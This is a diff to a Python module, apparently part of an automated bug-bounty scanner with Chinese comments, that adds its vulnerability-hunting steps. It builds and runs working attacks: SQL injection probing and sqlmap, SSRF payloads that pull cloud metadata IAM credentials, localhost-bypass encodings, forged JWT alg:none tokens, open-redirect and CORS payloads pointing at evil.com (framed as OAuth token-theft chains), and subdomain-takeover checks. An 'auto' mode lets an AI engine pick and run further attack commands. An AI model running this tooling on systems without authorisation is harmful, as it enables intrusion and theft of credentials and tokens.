@@ -1,7 +1,17 @@
-"""Hunt Phase — 漏洞挖掘阶段"""
+"""Hunt Phase — 漏洞挖掘阶段（增强版）
+
+增强内容：
+- SQLi 检测（error-based + time-based blind via sqlmap）
+- SSRF 检测（云 metadata + 内网探测）
+- JWT 审计（alg:none, 弱密钥, kid注入）
+- 子域名接管验证（CNAME 悬挂检测）
+- 开放重定向检测（为 OAuth chain 做准备）
+- 保留原有: Nuclei + XSS + CORS + 竞态 + IDOR + 密钥泄露
+"""
 
 import sys
 import os
+import re
 import hashlib
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -10,54 +20,77 @@ from .base import BasePhase
 
 
 class HuntPhase(BasePhase):
-    """漏洞挖掘：XSS、CORS、密钥泄露、并发竞态、IDOR越权"""
+    """漏洞挖掘：SQLi、SSRF、JWT、XSS、CORS、竞态、IDOR、子域名接管、开放重定向"""
     
     def execute(self, target: str, findings: dict) -> dict:
         phase_findings = {"vulnerabilities": [], "secrets": []}
         
-        self.logger.log_phase_start("漏洞挖掘 (Hunt)")
+        self.logger.log_phase_start("漏洞挖掘 (Hunt — Enhanced)")
         
-        # Step 1: Nuclei 扫描（限速+只扫高危）
+        # ═══ Step 1: Nuclei 扫描（限速+高中危）═══
         alive = findings.get('alive_hosts', [])
         if alive:
-            pipe_cmd = self._pipe_lines(alive[:20])
-            self._step("Nuclei高危扫描", target, phase_findings, findings,
-                       f"{pipe_cmd} | nuclei -severity critical,high -rate-limit 5 -c 3 -silent 2>/dev/null | head -50",
+            hosts = [h.split()[0] if ' ' in h else h for h in alive[:30]]
+            pipe_cmd = self._pipe_lines(hosts)
+            self._step("Nuclei高中危扫描", target, phase_findings, findings,
+                       f"{pipe_cmd} | nuclei -severity critical,high,medium -rate-limit 5 -c 3 -silent 2>/dev/null | head -80",
                        self._parse_nuclei,
                        "vulnerabilities")
         
-        # Step 2: XSS 检测 (dalfox)
+        # ═══ Step 2: SQLi 检测 ═══
+        self._sqli_test(target, findings, phase_findings)
+        
+        # ═══ Step 3: SSRF 检测 ═══
+        self._ssrf_test(target, findings, phase_findings)
+        
+        # ═══ Step 4: XSS 检测 (dalfox) ═══
         params = findings.get('params', [])
-        xss_urls = [p for p in params if '?' in p][:10]
+        xss_urls = [p for p in params if '?' in p and '[' not in p][:15]
         if xss_urls:
             pipe_cmd = self._pipe_lines(xss_urls)
             self._step("Dalfox XSS检测", target, phase_findings, findings,
-                       f"{pipe_cmd} | dalfox pipe --worker 2 --delay 300 --silence 2>/dev/null | head -20",
+                       f"{pipe_cmd} | dalfox pipe --worker 2 --delay 300 --silence 2>/dev/null | head -30",
                        self._parse_dalfox,
                        "vulnerabilities")
         
-        # Step 3: CORS 错配检测
+        # ═══ Step 5: CORS 错配检测（增强：测试 credentials）═══
         if alive:
-            pipe_cmd = self._pipe_lines(alive[:10])
-            self._step("CORS错配检测", target, phase_findings, findings,
-                       f"{pipe_cmd} | while read h; do curl -s -H 'Origin: https://evil.com' -I \"$h\" 2>/dev/null | grep -i 'access-control' && echo \"CORS: $h\"; done | head -20",
+            hosts = [h.split()[0] if ' ' in h else h for h in alive[:10]]
+            pipe_cmd = self._pipe_lines(hosts)
+            self._step("CORS错配检测(含credentials)", target, phase_findings, findings,
+                       f"{pipe_cmd} | while read h; do "
+                       f"resp=$(curl -s -H 'Origin: https://evil.com' -I \"$h\" 2>/dev/null); "
+                       f"echo \"$resp\" | grep -qi 'access-control-allow-origin.*evil\\|access-control-allow-origin.*\\*' && "
+                       f"echo \"$resp\" | grep -qi 'access-control-allow-credentials.*true' && "
+                       f"echo \"CORS_CRED: $h\" || "
+                       f"(echo \"$resp\" | grep -qi 'access-control-allow-origin.*evil\\|access-control-allow-origin.*\\*' && echo \"CORS: $h\"); "
+                       f"done | head -20",
                        self._parse_cors,
                        "vulnerabilities")
         
-        # Step 4: 密钥泄露扫描
+        # ═══ Step 6: JWT 审计 ═══
+        self._jwt_audit(target, findings, phase_findings)
+        
+        # ═══ Step 7: 开放重定向检测（为 chain 做准备）═══
+        self._open_redirect_test(target, findings, phase_findings)
+        
+        # ═══ Step 8: 子域名接管验证 ═══
+        self._subdomain_takeover_test(target, findings, phase_findings)
+        
+        # ═══ Step 9: 密钥泄露扫描 ═══
         safe_org = target.split('.')[0] if '.' in target else target
         self._step("TruffleHog密钥扫描", target, phase_findings, findings,
                    f"trufflehog github --org={shell_quote(safe_org)} --only-verified --json 2>/dev/null | head -10",
                    self._parse_secrets,
                    "secrets")
         
-        # Step 5: 并发竞态检测（SRC高价值）
+        # ═══ Step 10: 并发竞态检测 ═══
         self._race_condition_test(target, findings, phase_findings)
         
-        # Step 6: IDOR 越权检测（多账号对比）
+        # ═══ Step 11: IDOR 越权检测 ═══
         self._idor_test(target, findings, phase_findings)
         
-        # Step 7: AI 决策额外攻击面
+        # ═══ Step 12: AI 决策额外攻击面 ═══
         if self.mode == "auto":
             combined = {**findings, **phase_findings}
             decision = self.engine.decide_next_action("hunt", combined, target)
@@ -68,6 +101,383 @@ class HuntPhase(BasePhase):
                                phase_findings, findings, cmd, lambda out: [], None)
         
         return phase_findings
+    
+    # ═══════════════════════════════════════════════════════════════
+    #  新增：SQLi 检测
+    # ═══════════════════════════════════════════════════════════════
+    
+    def _sqli_test(self, target: str, findings: dict, phase_findings: dict):
+        """SQL 注入检测：error-based 快速探测 + sqlmap 验证"""
+        params = findings.get('params', [])
+        urls_with_params = [p for p in params if '?' in p and '[' not in p][:30]
+        
+        if not urls_with_params:
+            return
+        
+        # Step A: 快速 error-based 探测（单引号触发错误）
+        sqli_candidates = []
+        pipe_cmd = self._pipe_lines(urls_with_params[:20])
+        self._step("SQLi快速探测(单引号)", target, phase_findings, findings,
+                   f"{pipe_cmd} | while read url; do "
+                   f"test_url=$(echo \"$url\" | sed \"s/=\\([^&]*\\)/=\\1'/g\"); "
+                   f"resp=$(curl -s --max-time 8 \"$test_url\" 2>/dev/null); "
+                   f"echo \"$resp\" | grep -qiE 'sql syntax|mysql|ORA-|postgresql|sqlite|unclosed quotation|syntax error' && "
+                   f"echo \"SQLI_CANDIDATE: $url\"; "
+                   f"done",
+                   self._parse_sqli_candidates,
+                   "vulnerabilities")
+        
+        # Step B: 对候选 URL 用 sqlmap 验证（限制 level/risk 避免太慢）
+        sqli_urls = [v.get('url', '') for v in phase_findings["vulnerabilities"] 
+                    if v.get('type') == 'SQLi (候选)'][:5]
+        
+        if sqli_urls:
+            for url in sqli_urls:
+                safe_url = sanitize_url(url)
+                self._step(f"sqlmap验证: {url[:50]}", target, phase_findings, findings,
+                           f"sqlmap -u {shell_quote(safe_url)} --batch --level=2 --risk=2 "
+                           f"--threads=3 --timeout=15 --retries=1 --random-agent "
+                           f"--technique=BEU --smart 2>/dev/null | "
+                           f"grep -iE 'injectable|parameter|payload|is vulnerable' | head -10",
+                           self._parse_sqlmap,
+                           "vulnerabilities")
+        
+        # Step C: gf sqli 模式补充（从URL模式匹配）
+        all_urls = findings.get('urls', [])[:200]
+        if all_urls:
+            pipe_cmd = self._pipe_lines(all_urls)
+            self._step("gf SQLi模式匹配", target, phase_findings, findings,
+                       f"{pipe_cmd} | gf sqli 2>/dev/null | sort -u | head -20",
+                       lambda out: [f"[SQLI_PATTERN] {u}" for u in out.strip().split('\n') if u.strip()],
+                       "vulnerabilities")
+    
+    # ═══════════════════════════════════════════════════════════════
+    #  新增：SSRF 检测
+    # ═══════════════════════════════════════════════════════════════
+    
+    def _ssrf_test(self, target: str, findings: dict, phase_findings: dict):
+        """SSRF 检测：URL参数注入内网地址/云 metadata"""
+        params = findings.get('params', [])
+        
+        # 找含 URL/路径参数的接口
+        ssrf_candidates = []
+        url_param_patterns = re.compile(
+            r'[?&](url|uri|path|link|src|source|dest|destination|redirect|return|'
+            r'next|target|rurl|ref|callback|webhook|proxy|fetch|load|img|image|'
+            r'file|document|page|site|html)=', re.I
+        )
+        
+        for url in params:
+            if url_param_patterns.search(url):
+                ssrf_candidates.append(url)
+        
+        # 从 gf ssrf 结果中补充
+        gf_ssrf = [p for p in params if '[' not in p and 
+                  any(kw in p.lower() for kw in ['url=', 'uri=', 'path=', 'src=', 'dest=', 'redirect='])]
+        ssrf_candidates.extend(gf_ssrf)
+        ssrf_candidates = list(set(ssrf_candidates))[:15]
+        
+        if not ssrf_candidates:
+            return
+        
+        self.logger.log_event("FINDING", f"发现 {len(ssrf_candidates)} 个SSRF候选参数")
+        
+        # 测试 metadata endpoint
+        metadata_payloads = [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://metadata.google.internal/computeMetadata/v1/",
+            "http://100.100.100.200/latest/meta-data/",  # 阿里云
+        ]
+        
+        for url in ssrf_candidates[:5]:
+            safe_url = sanitize_url(url)
+            # 替换参数值为 metadata URL
+            for payload in metadata_payloads[:2]:
+                # 替换最后一个参数值
+                test_url = re.sub(r'(=)[^&]*$', f'\\1{payload}', safe_url)
+                if test_url == safe_url:
+                    test_url = re.sub(r'(=)[^&]*(&)', f'\\1{payload}\\2', safe_url, count=1)
+                
+                self._step(f"SSRF metadata: {url[:40]}", target, phase_findings, findings,
+                           f"curl -s --max-time 10 {shell_quote(test_url)} 2>/dev/null | "
+                           f"grep -iE 'ami-|instance-id|iam|AccessKeyId|security-credentials|"
+                           f"compute|project-id|zone|hostname' | head -5",
+                           self._parse_ssrf,
+                           "vulnerabilities")
+        
+        # 测试内网回连（127.0.0.1 各种绕过）
+        bypass_payloads = [
+            "http://127.0.0.1:80/",
+            "http://0x7f000001/",
+            "http://2130706433/",
+            "http://127.1/",
+            "http://[::1]/",
+        ]
+        
+        for url in ssrf_candidates[:3]:
+            safe_url = sanitize_url(url)
+            for payload in bypass_payloads[:2]:
+                test_url = re.sub(r'(=)[^&]*$', f'\\1{payload}', safe_url)
+                self._step(f"SSRF内网: {url[:40]}", target, phase_findings, findings,
+                           f"resp=$(curl -s -w '\\nHTTP_CODE:%{{http_code}}\\nSIZE:%{{size_download}}' "
+                           f"--max-time 8 {shell_quote(test_url)} 2>/dev/null); "
+                           f"echo \"$resp\" | tail -3",
+                           self._parse_ssrf_blind,
+                           "vulnerabilities")
+    
+    # ═══════════════════════════════════════════════════════════════
+    #  新增：JWT 审计
+    # ═══════════════════════════════════════════════════════════════
+    
+    def _jwt_audit(self, target: str, findings: dict, phase_findings: dict):
+        """JWT 审计：alg:none, 弱密钥, kid注入"""
+        # 从已有数据中提取 JWT token
+        all_data = ' '.join(findings.get('urls', [])[:50]) + ' '
+        all_data += ' '.join(findings.get('params', [])[:50])
+        
+        # JWT 正则匹配
+        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
+        jwt_tokens = jwt_pattern.findall(all_data)
+        
+        if not jwt_tokens:
+            # 尝试从存活主机的响应头中提取
+            alive = findings.get('alive_hosts', [])
+            if alive:
+                hosts = [h.split()[0] if ' ' in h else h for h in alive[:3]]
+                pipe_cmd = self._pipe_lines(hosts)
+                self._step("JWT Token提取", target, phase_findings, findings,
+                           f"{pipe_cmd} | while read h; do "
+                           f"curl -s -I --max-time 8 \"$h\" 2>/dev/null | "
+                           f"grep -oE 'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+'; "
+                           f"done | head -5",
+                           lambda out: [t for t in out.strip().split('\n') if t.startswith('eyJ')],
+                           "vulnerabilities")
+            return
+        
+        self.logger.log_event("FINDING", f"发现 {len(jwt_tokens)} 个 JWT token")
+        
+        # 对每个 JWT 做基础审计
+        for token in list(set(jwt_tokens))[:3]:
+            # 解码 header 检查 alg
+            self._step(f"JWT解码审计", target, phase_findings, findings,
+                       f"echo {shell_quote(token.split('.')[0])} | base64 -d 2>/dev/null; echo",
+                       self._parse_jwt_header,
+                       "vulnerabilities")
+            
+            # 尝试 alg:none 攻击
+            self._step("JWT alg:none测试", target, phase_findings, findings,
+                       f"header=$(echo -n '{{\"alg\":\"none\",\"typ\":\"JWT\"}}' | base64 -w0 | tr '+/' '-_' | tr -d '='); "
+                       f"payload=$(echo {shell_quote(token)} | cut -d. -f2); "
+                       f"echo \"$header.$payload.\"",
+                       lambda out: [f"[JWT_NONE] {out.strip()}"] if out.strip() else [],
+                       "vulnerabilities")
+    
+    # ═══════════════════════════════════════════════════════════════
+    #  新增：开放重定向检测
+    # ═══════════════════════════════════════════════════════════════
+    
+    def _open_redirect_test(self, target: str, findings: dict, phase_findings: dict):
+        """开放重定向检测：为后续 OAuth chain 做准备"""
+        params = findings.get('params', [])
+        
+        # 找含重定向参数的 URL
+        redirect_params = re.compile(
+            r'[?&](redirect|return|next|url|rurl|dest|destination|continue|'
+            r'forward|goto|target|redir|return_to|redirect_uri|callback|returnUrl)=', re.I
+        )
+        
+        redirect_candidates = [u for u in params if redirect_params.search(u) and '[' not in u][:10]
+        
+        if not redirect_candidates:
+            return
+        
+        self.logger.log_event("FINDING", f"发现 {len(redirect_candidates)} 个重定向参数候选")
+        
+        # 用多种绕过方式测试
+        redirect_payloads = [
+            "https://evil.com",
+            "//evil.com",
+            "/\\evil.com",
+            "https://evil.com%00.{target}",
+            "https://{target}@evil.com",
+            "////evil.com",
+        ]
+        
+        for url in redirect_candidates[:5]:
+            safe_url = sanitize_url(url)
+            for payload in redirect_payloads[:3]:
+                test_payload = payload.replace('{target}', target)
+                test_url = re.sub(r'(redirect|return|next|url|dest|callback|returnUrl|redirect_uri)=[^&]*',
+                                 f'\\1={test_payload}', safe_url, count=1, flags=re.I)
+                
+                self._step(f"开放重定向: {url[:40]}", target, phase_findings, findings,
+                           f"resp=$(curl -s -o /dev/null -w '%{{http_code}} %{{redirect_url}}' "
+                           f"-L --max-redirs 0 --max-time 8 {shell_quote(test_url)} 2>/dev/null); "
+                           f"echo \"$resp\" | grep -iE '30[12].*evil|Location.*evil' && "
+                           f"echo \"REDIRECT_VULN: {test_url}\"",
+                           self._parse_redirect,
+                           "vulnerabilities")
+    
+    # ═══════════════════════════════════════════════════════════════
+    #  新增：子域名接管验证
+    # ═══════════════════════════════════════════════════════════════
+    
+    def _subdomain_takeover_test(self, target: str, findings: dict, phase_findings: dict):
+        """子域名接管验证：检查 CNAME 悬挂"""
+        # 从 recon 阶段获取接管候选
+        takeover_candidates = [u for u in findings.get('urls', []) if '[TAKEOVER]' in u]
+        
+        if not takeover_candidates:
+            # 也检查所有子域名的 CNAME
+            subdomains = findings.get('subdomains', [])[:50]
+            if subdomains:
+                pipe_cmd = self._pipe_lines(subdomains)
+                self._step("CNAME悬挂检测", target, phase_findings, findings,
+                           f"{pipe_cmd} | while read sub; do "
+                           f"cname=$(dig +short CNAME \"$sub\" 2>/dev/null | head -1); "
+                           f"if [ -n \"$cname\" ]; then "
+                           f"  host \"$cname\" 2>/dev/null | grep -q 'NXDOMAIN\\|not found' && "
+                           f"  echo \"TAKEOVER: $sub -> $cname\"; "
+                           f"fi; done",
+                           self._parse_takeover_verified,
+                           "vulnerabilities")
+        else:
+            for candidate in takeover_candidates[:10]:
+                sub = candidate.replace('[TAKEOVER]', '').strip()
+                self._step(f"接管验证: {sub}", target, phase_findings, findings,
+                           f"cname=$(dig +short CNAME {shell_quote(sub)} 2>/dev/null | head -1); "
+                           f"echo \"CNAME: $cname\"; "
+                           f"host \"$cname\" 2>/dev/null | grep -q 'NXDOMAIN\\|not found' && "
+                           f"echo \"CONFIRMED_TAKEOVER: {sub} -> $cname\"",
+                           self._parse_takeover_verified,
+                           "vulnerabilities")
+    
+    # ═══════════════════════════════════════════════════════════════
+    #  解析方法（新增）
+    # ═══════════════════════════════════════════════════════════════
+    
+    def _parse_sqli_candidates(self, output: str) -> list:
+        """解析 SQLi 快速探测结果"""
+        vulns = []
+        for line in output.strip().split('\n'):
+            if 'SQLI_CANDIDATE:' in line:
+                url = line.replace('SQLI_CANDIDATE:', '').strip()
+                vulns.append({
+                    "type": "SQLi (候选)",
+                    "url": url,
+                    "severity": "high",
+                    "detail": "单引号触发SQL错误响应，需sqlmap确认"
+                })
+                self.logger.log_event("FINDING", f"⚠️ SQLi候选: {url[:80]}")
+        return vulns
+    
+    def _parse_sqlmap(self, output: str) -> list:
+        """解析 sqlmap 输出"""
+        vulns = []
+        if any(kw in output.lower() for kw in ['injectable', 'is vulnerable', 'payload']):
+            vulns.append({
+                "type": "SQLi (confirmed)",
+                "url": "见sqlmap日志",
+                "severity": "critical",
+                "detail": output[:300]
+            })
+            self.logger.log_event("FINDING", f"🔥 SQLi确认! {output[:100]}")
+        return vulns
+    
+    def _parse_ssrf(self, output: str) -> list:
+        """解析 SSRF metadata 响应"""
+        vulns = []
+        if output.strip() and any(kw in output.lower() for kw in 
+                                   ['ami-', 'instance-id', 'iam', 'accesskeyid', 
+                                    'security-credentials', 'compute', 'project-id']):
+            vulns.append({
+                "type": "SSRF (Cloud Metadata)",
+                "url": "见日志",
+                "severity": "critical",
+                "detail": f"成功读取云 metadata: {output.strip()[:200]}"
+            })
+            self.logger.log_event("FINDING", f"🔥 SSRF 读到 metadata! {output[:100]}")
+        return vulns
+    
+    def _parse_ssrf_blind(self, output: str) -> list:
+        """解析 SSRF blind（通过响应大小/状态码差异判断）"""
+        vulns = []
+        # 如果返回了内容（SIZE > 0）且状态码是 200，可能有 SSRF
+        if 'HTTP_CODE:200' in output and 'SIZE:0' not in output:
+            size_match = re.search(r'SIZE:(\d+)', output)
+            if size_match and int(size_match.group(1)) > 50:
+                vulns.append({
+                    "type": "SSRF (Blind/Internal)",
+                    "url": "见日志",
+                    "severity": "high",
+                    "detail": f"内网请求返回了内容(size={size_match.group(1)})，需进一步确认"
+                })
+        return vulns
+    
+    def _parse_jwt_header(self, output: str) -> list:
+        """解析 JWT header"""
+        vulns = []
+        output_lower = output.lower()
+        if '"alg"' in output_lower:
+            if '"none"' in output_lower:
+                vulns.append({
+                    "type": "JWT alg:none",
+                    "url": "见token",
+                    "severity": "critical",
+                    "detail": "JWT使用alg:none，可伪造任意token"
+                })
+            elif '"hs256"' in output_lower:
+                vulns.append({
+                    "type": "JWT HS256 (可能弱密钥)",
+                    "url": "见token",
+                    "severity": "medium",
+                    "detail": "JWT使用HS256，尝试弱密钥爆破"
+                })
+            # kid 注入检测
+            if '"kid"' in output_lower:
+                vulns.append({
+                    "type": "JWT kid参数 (可能可注入)",
+                    "url": "见token",
+                    "severity": "medium",
+                    "detail": "JWT含kid字段，可能存在SQL注入或路径遍历"
+                })
+        return vulns
+    
+    def _parse_redirect(self, output: str) -> list:
+        """解析开放重定向测试结果"""
+        vulns = []
+        for line in output.strip().split('\n'):
+            if 'REDIRECT_VULN:' in line:
+                url = line.replace('REDIRECT_VULN:', '').strip()
+                vulns.append({
+                    "type": "Open Redirect",
+                    "url": url[:200],
+                    "severity": "medium",
+                    "detail": "开放重定向确认，可用于OAuth token窃取链",
+                    "chainable": True
+                })
+                self.logger.log_event("FINDING", f"⚠️ 开放重定向: {url[:80]}")
+        return vulns
+    
+    def _parse_takeover_verified(self, output: str) -> list:
+        """解析子域名接管验证结果"""
+        vulns = []
+        for line in output.strip().split('\n'):
+            if 'CONFIRMED_TAKEOVER:' in line or 'TAKEOVER:' in line:
+                detail = line.replace('CONFIRMED_TAKEOVER:', '').replace('TAKEOVER:', '').strip()
+                vulns.append({
+                    "type": "Subdomain Takeover",
+                    "url": detail,
+                    "severity": "high",
+                    "detail": f"CNAME悬挂确认: {detail}"
+                })
+                self.logger.log_event("FINDING", f"🔥 子域名接管: {detail}")
+        return vulns
+    
+    # ═══════════════════════════════════════════════════════════════
+    #  原有方法（保留）
+    # ═══════════════════════════════════════════════════════════════
     
     def _race_condition_test(self, target: str, findings: dict, phase_findings: dict):
         """并发竞态自动检测"""
